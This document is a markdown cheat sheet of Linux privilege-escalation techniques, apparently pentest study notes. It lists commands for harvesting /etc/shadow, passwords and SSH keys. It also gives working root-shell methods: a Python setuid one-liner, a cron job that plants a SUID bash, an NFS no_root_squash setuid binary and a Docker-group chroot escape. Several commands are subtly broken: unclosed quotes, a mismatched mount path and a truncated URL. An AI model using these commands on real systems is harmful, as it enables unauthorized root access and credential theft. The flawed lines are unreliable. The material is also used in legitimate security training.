# Linux privilege escalation

## Manual enumeration

### User

```text
whoami
id
history
```

### Other Users

```text
cat /etc/passwd
who
```

### Privileges

```text
sudo -l
cat /etc/sudoers
```

### File system

```text
pwd (current location)
echo $PATH
```

### Hostname

```text
hostname
```

### OS and architecture

```text
cat /etc/issue
cat /etc/*-release
uname -a
lscpu
```

### Processes and services

```text
ps aux
```

#### pspy

pspy allows you to see commands run by other users, cron jobs, etc. as they execute.

{% embed url="https://github.com/DominicBreuker/psp" %}

```text
# print events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 
```

### Network

```text
ifconfig OR ip a (interfaces)
route OR route l (routing table)
netstat -ano OR ss -anp (active connections)
arp -a
```

### Applications/patch levels/drivers/kernel modules

```text
dpkg -l
lsmod (lists all kernel modules loaded)
/sbin/modinfo libata (more info on specific kernel modules - libata in this example)
```

### Readable/writeable directories

```text
find / -writeable -type d 2>/dev/null
```

### Unmounted disks

```text
mount
cat /etc/fstab (drives mounted at boot)
lsblk (all available disks)
```

### Sensitive files

```text
history
cat /etc/passwd 
cat /etc/shadow 
cat /etc/group 
```

### Passwords

Search the file system for passwords.  Try additional search terms \(pass, etc.\).

```text
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

### SSH keys

Search the filesystem for SSH keys.  Public keys are typically stored in the "authorized\_keys" folder, private keys are stored as "id\_rsa". 

```text
find / -name id_rsa* 2> /dev/null
find / -name authorized_keys* 2> /dev/null
```

## Automated tools

```text
LinPeas.sh
LinEnum.sh
Linux Exploit Suggester
LinuxPrivChecker.py
```

## Exploitation paths

### SUID Files

SUID files allow individuals to execute files using the privileges of another user.  They are identifiable by an "s" in the third character of the root permissions for a file.  You can search manually with:

```text
find / -perm -u=s -type f 2>/dev/null
```

If you find identify a SUID file, check [GTFO bins](https://gtfobins.github.io/) for exploits

### Capabilities

The exploitation for capabilities is similar to that of SUID files.  Search for capabilities with:

```text
getcap -r / 2>/dev/null
```

Look for "+ep" at the end of any returned items.  If present, exploitation possible.

### Execution

Run Python to escalate

```text
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")
```

Other possibly exploitable capabilities include perl, tar, openssl \(check [GTFO bins](https://gtfobins.github.io/)\)

### Scheduled Tasks

```text
cat /etc/cron*
cat /etc/crontab
systemctl list-timers --all
```

Columns represent minute, hour, day of month, month, day of week.  Asterisks in columns indicate "all", asterisks in all fields indicates that the task runs every minute/hour/day of month/month/day of week

#### Exploitation

First, check the file type using the `file` command and whether or not you have write access.  Sometimes replacing the file with one created on your attacking machine is easier than modifying the file that is in place. If so, rename the current file as \*.old and use wget to replace with the version created on your attack machine.

```text
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > script
**Wait for the job to execute, then
/tmp/bash -p
```

### NFS root squashing

Check `cat /etc/exports` for results indicating "no\_root\_squash", indicating folders that are shareable and can be mounted. If available, remote commands are executed as root.

#### Exploitation

From the attacking machine: 

Search for mountable shares 

```text
showmount -e ipaddress
```

Create a new directory:

```text
mkdir /tmp/mntme
```

 Mount the folder: 

```text
mount -o rw, vers=2 ipaddress:/tmp /tmp/mountme
```

Create malicious file:

```text
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; /tmp/mountme/x.c
```

Compile the file:

```text
gcc /tmp/mountme/x.c -o /tmp/mountme/x
```

Return to the victim machine, navigate to the target directory \(/tmp\), and execute the file

```text
./x
```

### Docker

If you are in the Docker group, check to see which containers are available:

```text
docker image ls
```

Run the image:

```text
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

